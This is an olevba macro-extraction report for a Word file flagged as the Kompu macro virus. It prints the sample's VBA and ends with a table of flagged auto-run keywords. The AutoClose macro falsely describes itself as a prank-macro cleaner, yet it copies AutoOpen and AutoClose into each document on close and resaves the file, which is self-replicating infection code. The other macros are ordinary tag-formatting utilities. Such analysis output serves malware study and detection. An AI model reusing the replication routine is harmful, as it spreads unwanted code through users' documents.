olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim fileenimi$
'AutoClose
'Makroviirus Kompu
On Error Resume Next
fileenimi$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:AutoOpen", fileenimi$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoClose", fileenimi$ + ":AutoClose"
WordBasic.FileSaveAs Name:=fileenimi$, Format:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO autoOpen.vba 
in file: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HideTags()
Attribute HideTags.VB_Description = "Macro recorded 09/04/97 by Bert-Jan Lappenschaar"
Attribute HideTags.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.HideTags"
'
' HideTags Macro
' Macro recorded 09/04/97 by Bert-Jan Lappenschaar
'
    
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = False
    With Selection.Find.Replacement.Font
        .Hidden = True
        .Animation = wdAnimationNone
    End With
    With Selection.Find
        .Text = "\<[!ibB][!\>rR]*\>"
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = True
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    hidehiddentext
End Sub
Sub Unhide()
Attribute Unhide.VB_Description = "Macro recorded 09/04/97 by Bert-Jan Lappenschaar"
Attribute Unhide.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Unhide"
'
' Unhide Macro
' Macro recorded 09/04/97 by Bert-Jan Lappenschaar
'
    showhiddentext
    Selection.Find.ClearFormatting
    Selection.Find.Font.Hidden = True
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = False
    With Selection.Find.Replacement.Font
        .Hidden = False
        .Animation = wdAnimationNone
    End With
    With Selection.Find
        .Text = "\<[!ibB][!\>rR]*\>"
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = True
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub showhiddentext()
Attribute showhiddentext.VB_Description = "Macro recorded 09/04/97 by Bert-Jan Lappenschaar"
Attribute showhiddentext.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.showhiddentext"
'
' showhiddentext Macro
' Macro recorded 09/04/97 by Bert-Jan Lappenschaar
'
    Application.DisplayStatusBar = True
    With ActiveWindow
        .DisplayHorizontalScrollBar = True
        .DisplayVerticalScrollBar = True
        .DisplayVerticalRuler = True
        .DisplayScreenTips = True
        With .View
            .ShowAnimation = True
            .ShowPicturePlaceHolders = False
            .ShowFieldCodes = False
            .ShowBookmarks = False
            .FieldShading = wdFieldShadingWhenSelected
            .ShowTabs = False
            .ShowSpaces = False
            .ShowParagraphs = False
            .ShowHyphens = False
            .showhiddentext = True
            .ShowAll = False
            .ShowDrawings = True
            .ShowObjectAnchors = False
            .ShowTextBoundaries = False
            .ShowHighlight = True
        End With
    End With
End Sub
Sub hidehiddentext()
Attribute hidehiddentext.VB_Description = "Macro recorded 09/04/97 by Bert-Jan Lappenschaar"
Attribute hidehiddentext.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.hidehiddentext"
'
' hidehiddentext Macro
' Macro recorded 09/04/97 by Bert-Jan Lappenschaar
'
    Application.DisplayStatusBar = True
    With ActiveWindow
        .DisplayHorizontalScrollBar = True
        .DisplayVerticalScrollBar = True
        .DisplayVerticalRuler = True
        .DisplayScreenTips = True
        With .View
            .ShowAnimation = True
            .ShowPicturePlaceHolders = False
            .ShowFieldCodes = False
            .ShowBookmarks = False
            .FieldShading = wdFieldShadingWhenSelected
            .ShowTabs = False
            .ShowSpaces = False
            .ShowParagraphs = False
            .ShowHyphens = False
            .showhiddentext = False
            .ShowAll = False
            .ShowDrawings = True
            .ShowObjectAnchors = False
            .ShowTextBoundaries = False
            .ShowHighlight = True
        End With
    End With
End Sub

Sub protecttags()
'
' protecttags Macro
' Macro written on 09/05/97 by Bert-Jan Lappenschaar
'

'Move Selection(cursor) to top of document
Selection.HomeKey Unit:=wdStory, Extend:=wdMove

Application.ScreenUpdating = False

Dim NumberOfTags
Dim TagString As String

NumberOfTags = -1

With Application.ActiveWindow.View
    .showhiddentext = False
    .ShowFieldCodes = False
End With



Do
    'Find tag:
    With Selection.Find
        .Wrap = wdFindStop
        .MatchWildcards = True
        .ClearFormatting
        .Execute FindText:="\<[!/iIbB][!\>rR]*\>*\</*\>", Forward:=True
        
    End With
   
 
    If Selection.Find.Found = False Then
    Exit Do
    End If
    

        
    'Set of Boolean variables to indicate in what part of the
    'tag we are.
    
    StopLoop = False
    FirstPartOfTag = True
    MiddlePartOfTag = False
    LastPartOfTag = False
    
    'Loop that changes the formatting of a map_name tag to:
    ' <firstpartoftag> = hidden  placename = blue </lastpartoftag> = hidden
    
    
   
    TagString = Selection.Range.Text
    
    If InStr(TagString, "map_name") > 0 Then
         i = 1
         
             'Insert macro button:
        MacroButtonText = "MACROBUTTON locktags " + Selection.Range.Text
        Selection.Fields.Add Range:=Selection.Range, Type:=wdFieldEmpty, Text:= _
        MacroButtonText, PreserveFormatting:=False
        
               
        
        'Select string in macrobutton starting with 22nd char.(the tag)
        Thisfieldno = ActiveDocument.Fields.Count
        Set TagRange = ActiveDocument.Fields(Thisfieldno).Code

        TagRange.SetRange Start:=TagRange.Start + 22, End:=TagRange.End
        TagString = TagRange.Text
        'test; MsgBox (TagRange), , "wat is in field 1?"
    
        'Now, let's start formatting the tag.
         
         Do While i <= TagRange.Characters.Count And StopLoop <> True
                    
                    If FirstPartOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.Hidden = True
                        If char = ">" Then
                            FirstPartOfTag = False
                            MiddlePartOfTag = True
                        End If
                        i = i + 1
                    ElseIf MiddlePartOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.ColorIndex = wdBlue
                        
                        If char = "<" Then
                            MiddlePartOfTag = False
                            EndOfTag = True
                            i = i - 1 'One step back, "<" should be formatted as hidden in next loop
                        End If
                        i = i + 1
                    ElseIf EndOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.Hidden = True
                            If char = ">" Then
                                FirstPartOfTag = True
                                MiddlePartOfTag = False
                                StopLoop = True
                            End If
                        i = i + 1
                     End If
                    
         Loop
    
    ElseIf InStr(TagString, "literal") > 0 Then
         i = 1
         
             'Insert macro button:
        MacroButtonText = "MACROBUTTON literalt " + Selection.Range.Text
        Selection.Fields.Add Range:=Selection.Range, Type:=wdFieldEmpty, Text:= _
        MacroButtonText, PreserveFormatting:=False
       
        'Select string in macrobutton starting with 22nd char.(the tag)
        Thisfieldno = ActiveDocument.Fields.Count
        Set TagRange = ActiveDocument.Fields(Thisfieldno).Code

        TagRange.SetRange Start:=TagRange.Start + 22, End:=TagRange.End
        TagString = TagRange.Text
        'testje; MsgBox (TagRange), , "wat is in field 1?"
    
        'Now, let's start formatting the tag.
         
         Do While i <= TagRange.Characters.Count And StopLoop <> True
                    
                    If FirstPartOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.Hidden = True
                        If char = ">" Then
                            FirstPartOfTag = False
                            MiddlePartOfTag = True
                        End If
                        i = i + 1
                    ElseIf MiddlePartOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.ColorIndex = wdGreen
                        
                        If char = "<" Then
                            MiddlePartOfTag = False
                            EndOfTag = True
                            i = i - 1 'One step back, "<" should be hidden in next loop
                        End If
                        i = i + 1
                    ElseIf EndOfTag = True Then
                        char = TagRange.Characters(i)
                        TagRange.Characters(i).Font.Hidden = True
                            If char = ">" Then
                                FirstPartOfTag = True
                                MiddlePartOfTag = False
                                StopLoop = True
                            End If
                        i = i + 1
                     End If
                    
         Loop
    
    End If
    
    tdl = "Parsing text and protecting Tags. This might take a while..." + "        Number of tags found: " & ActiveDocument.Fields.Count
    Application.StatusBar = tdl
        
    
    Selection.Start = Selection.End
      
Loop

'locking fields doesn't work in an embedded object so I commented
'it out.
'ActiveDocument.Fields.Locked = True

With Application
    .ScreenUpdating = True
    .StatusBar = "Tags protected successfully. You can edit the document now."
End With
End Sub
Sub InsertMacroButton()
Attribute InsertMacroButton.VB_Description = "Macro recorded 09/05/97 by Bert-Jan Lappenschaar"
Attribute InsertMacroButton.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.InsertMacroButton"
'
' InsertMacroButton Macro
' Macro recorded 09/05/97 by Bert-Jan Lappenschaar
'
Set myRange = ActiveDocument.Range(Start:=0, End:=10)
    .Fields.Add Range:=Selection.Range, Type:=wdFieldMacroButton, _
    Text:=myRange, PreserveFormatting:=False
End Sub
Sub RemoveFormatting()
Attribute RemoveFormatting.VB_Description = "Macro recorded 09/08/97 by Bert-Jan Lappenschaar"
Attribute RemoveFormatting.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.RemoveFormatting"
'
' RemoveFormatting Macro
' Macro recorded 09/08/97 by Bert-Jan Lappenschaar
'

Application.ScreenUpdating = False
    Selection.WholeStory
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 10
        .Bold = False
        .Italic = False
        .Underline = wdUnderlineNone
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = False
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdAuto
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationNone
    End With
    
Selection.HomeKey Unit:=wdStory, Extend:=wdMove
Application.ScreenUpdating = True
End Sub
Sub insertmacrob2()
Attribute insertmacrob2.VB_Description = "Macro recorded 09/08/97 by Bert-Jan Lappenschaar"
Attribute insertmacrob2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.insertmacrob2"
'
' insertmacrob2 Macro
' Macro written on 09/08/97 by Bert-Jan Lappenschaar
'

Dim MacroButtonText As String

MacroButtonText = "MACROBUTTON removefo " + Selection.Range.Text
Selection.Fields.Add Range:=Selection.Range, Type:=wdFieldEmpty, Text:= _
    MacroButtonText, PreserveFormatting:=False
    
    Thisfieldno = ActiveDocument.Fields.Count
    
    'Select string in macrobutton starting with 22nd char.
    Set TagRange = ActiveDocument.Fields(Thisfieldno).Code

    TagRange.SetRange Start:=TagRange.Start + 22, End:=TagRange.End
    
    MsgBox (TagRange), , "wat is in field 1?"
End Sub

Sub Locktags()
'
' Locktags Macro
' Macro written 09/09/97 by Bert-Jan Lappenschaar
' Is activated if a macrobutton (placename) is doubleclicked in the
' text.
Set TagRange = Selection.Fields(1).Code
TagRange.SetRange Start:=TagRange.Start + 22, End:=TagRange.End


Load ChangetoLiteral
ChangetoLiteral.Codetext.Caption = TagRange
ChangetoLiteral.Show

End Sub


Sub Literalt()
'
' Literalt Macro
' Macro written 09/09/97 by Bert-Jan Lappenschaar
' Is activated if a macrobutton (placename) is doubleclicked in the
' text.

MsgBox ("You've just double-clicked a Green literal placename!"), , "Protected Literal Placename"

End Sub

Sub TagsChecked()
Attribute TagsChecked.VB_Description = "Macro recorded 09/10/97 by Bert-Jan Lappenschaar"
Attribute TagsChecked.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.TagsChecked"
'
' TagsChecked Macro
' Macro written 09/10/97 by Bert-Jan Lappenschaar
'

Selection.HomeKey Unit:=wdStory, Extend:=wdMove
Application.StatusBar = "Searching for Missing tags. This might take a while..."
Intag = False
MissingTag = False
For Each letter In ActiveDocument.Characters
    If letter = "<" Then
        If Intag = True Then
            MissingTag = True
            Exit For
        End If
        Intag = True
    ElseIf letter = ">" Then
        If Intag = False Then
            MissingTag = True
            Exit For
        End If
        Intag = False
    End If
Next letter
'If loop has been finished Intag should be False, otherwhise
'the last character checked was < and that indicates a missing >

If Intag = True Then
    MissingTag = True
End If

num = 0
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "TagsChecked" Then num = aVar.Index
Next aVar
If num = 0 Then
    ActiveDocument.Variables.Add Name:="TagsChecked", Value:=True
Else
    ActiveDocument.Variables(num).Value = True
End If

If MissingTag = True Then
    MsgBox ("Missing < or > character in text. "), , "Tag Check"
Else
    Application.StatusBar = "Done. No missing < or > character in this text."

End If

End Sub

Sub unprotect()


'
' unprotect Macro
' Macro written 09/10/97 by Bert-Jan Lappenschaar
'



Application.ScreenUpdating = False
For Each mbutton In ActiveDocument.Fields
mbutton.Select
Set tempcode = mbutton.Code
tempcode.SetRange Start:=tempcode.Start + 22, End:=tempcode.End - 1

Selection.Text = tempcode
Next mbutton

Selection.HomeKey Unit:=wdStory, Extend:=wdMove
Application.ScreenUpdating = True

 End Sub


Sub findreplaceTab()
Attribute findreplaceTab.VB_Description = "Macro recorded 12/05/97 by t-bertj"
Attribute findreplaceTab.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.findreplace"
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = vbTab
        .Replacement.Text = " "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub findreplaceCr()
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = vbCr
        .Replacement.Text = " "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub findreplaceLf()
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = vbLf
        .Replacement.Text = " "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub findreplaceCrLf()
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = CrLf
        .Replacement.Text = " "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub findreplaceNewLine()
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = vbLf
        .Replacement.Text = " "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub findreplacespaces()
'
' findreplace Macro
' Macro recorded 12/05/97 by t-bertj
'

    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    

    With Selection.Find
        .Text = " @ "
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = True
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    
        Selection.Find.Execute Replace:=wdReplaceAll
    If Selection.Find.Found = True Then
    findreplacespaces
    End If
    
End Sub






Sub replaceall()
findreplaceTab
findreplaceCr
findreplaceLf
findreplaceNewLine
End Sub

-------------------------------------------------------------------------------
VBA MACRO ChangetoLiteral.frm 
in file: Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060 - OLE stream: 'Macros/VBA/ChangetoLiteral'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ChangeButton_Click()

    With Application
        .ScreenUpdating = False
        With .ActiveWindow.View
            .showhiddentext = True
            .ShowFieldCodes = True
        End With
    End With

    Set temprange = Selection.Range
    For Each letter In temprange.Characters
        If letter.Font.ColorIndex = wdBlue Then
            letter.Font.ColorIndex = wdGreen
        End If
    Next letter
    
    IsThereAField = False
    If Selection.Fields.Count > 0 Then
        Set Tempfield = Selection.Fields(1)
        IsThereAField = True
    End If
    With Selection.Find
        .Replacement.Font.Hidden = True
        .Execute FindText:="map_name", ReplaceWith:="literal", Replace:=wdReplaceOne
    End With
    With Application
        .ScreenUpdating = True
        With .ActiveWindow.View
            .showhiddentext = False
            .ShowFieldCodes = False
        End With
    End With
    If IsThereAField = True Then
        Set TagRange = Tempfield.Code
        TagRange.SetRange Start:=TagRange.Start + 22, End:=TagRange.End
        ChangetoLiteral.Codetext.Caption = TagRange
    End If

End Sub

Private Sub Frame1_Click()

End Sub

Private Sub Okbutton_Click()
Unload ChangetoLiteral
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Change
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Click on 'Change' to change this tag to literal. Click on OK to leave this dialog box.n
-------------------------------------------------------------------------------
VBA FORM Variable "b'Okbutton'" IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ChangeButton'" IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Codetext'" IN 'Virus.MSWord.Kompu.f-e254d4a31a9635181bf9762e64cce667b1663060' - OLE stream: 'Macros/ChangetoLiteral/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |ChangeButton_Click  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|open                |May open a file                              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

